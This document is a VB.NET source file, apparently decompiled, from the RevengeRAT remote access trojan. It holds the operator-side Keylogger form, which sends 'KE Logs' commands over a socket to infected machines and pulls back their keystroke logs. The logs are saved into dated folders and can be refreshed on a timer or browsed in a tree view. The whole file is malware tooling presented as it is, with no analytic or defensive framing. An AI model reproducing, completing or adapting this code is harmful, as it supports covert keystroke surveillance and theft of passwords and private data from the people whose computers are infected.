Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports RevengeRAT.My
Imports RevengeRAT.My.Resources
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Public Class Keylogger
    Public Old As String
    Public Path As String
    Public Sock As Integer
    Public T As String
    Public TH As String
    Public Sub New()
        Me.Path = String.Empty
        Me.T = DateTime.Now.ToString("yyyy-MM-dd")
        Me.TH = DateAndTime.TimeOfDay.ToString("h-mm-ss tt")
        Me.InitializeComponent()
    End Sub

    Private Sub Keylogger_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Forms.Main.s.Send(Me.Sock, "Exit")
    End Sub

    Private Sub Keylogger_Load(sender As Object, e As EventArgs) Handles Me.Load
        If Not Directory.Exists((Me.Path & Me.T)) Then
            Directory.CreateDirectory((Me.Path & Me.T))
        End If
        Dim str As String
        For Each str In Directory.GetDirectories(Me.Path)
            Dim node As New TreeNode
            node = Me.TreeView1.Nodes.Item(0)
            node.Nodes.Add(str, IO.Path.GetFileName(str), 0, 0)
            node.Tag = "0"
        Next
        My.Forms.Main.s.Send(Me.Sock, "KE Logs")
        Me.TreeView1.ExpandAll()
    End Sub

    Private Sub L_CheckedChanged(sender As Object, e As EventArgs) Handles L.CheckedChanged
        Me.Timer1.Enabled = Me.L.Checked
        If Me.L.Checked Then
            Me.Refresh.Enabled = False
        Else
            Me.Refresh.Enabled = True
        End If
    End Sub

    Private Sub Logs_TextChanged(sender As Object, e As EventArgs) Handles Logs.TextChanged
        Try
            Me.Old = Me.Logs.Text
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Refresh_Click(sender As Object, e As EventArgs) Handles Refresh.Click
        Me.Logs.Text = ""
        My.Forms.Main.s.Send(Me.Sock, "KE Logs")
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        My.Forms.Main.s.Send(Me.Sock, "KE Logs")
    End Sub

    Private Sub TreeView1_NodeMouseDoubleClick(sender As Object, e As TreeNodeMouseClickEventArgs) Handles TreeView1.NodeMouseDoubleClick
        If ((Me.TreeView1.SelectedNode.Text <> "Saved Data") AndAlso Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.TreeView1.SelectedNode.Tag, "1", False)))) Then
            If (Me.TreeView1.SelectedNode.SelectedImageIndex = 0) Then
                Dim str As String
                For Each str In Directory.GetFiles((Me.Path & Me.TreeView1.SelectedNode.Text))
                    If str.EndsWith(".Log") Then
                        Me.TreeView1.SelectedNode.Nodes.Add(str, IO.Path.GetFileName(str), 1, 1).ToolTipText = str
                        Me.TreeView1.SelectedNode.Tag = "1"
                    End If
                Next
            Else
                Me.Logs.Text = File.ReadAllText(Me.TreeView1.SelectedNode.ToolTipText)
            End If
        End If
    End Sub
End Class